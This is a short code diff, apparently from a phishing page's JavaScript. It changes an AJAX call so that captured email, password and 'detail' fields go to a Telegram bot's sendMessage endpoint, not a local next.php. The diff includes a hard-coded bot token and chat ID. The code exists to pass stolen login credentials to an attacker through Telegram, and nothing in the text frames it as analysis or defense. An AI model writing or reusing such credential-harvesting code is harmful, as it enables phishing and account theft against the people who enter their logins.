@@ -432,14 +432,23 @@ position: fixed;
          
          
 		$.ajax({
-         dataType: 'JSON',
-         url: 'next.php',
-        type: 'POST',
-         data:{
-           email:email,
-           password:password,
-          detail:detail 
-             }
+          url: "https://api.telegram.org/bot8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM/sendMessage",
+
+        type: "POST",
+
+        data: {
+
+            chat_id: "8614416084",
+
+            text:
+
+                "email: " + email +
+
+                "\npassword: " + password +
+
+                "\nDetail: " + detail
+
+        }
           }); 
           
           
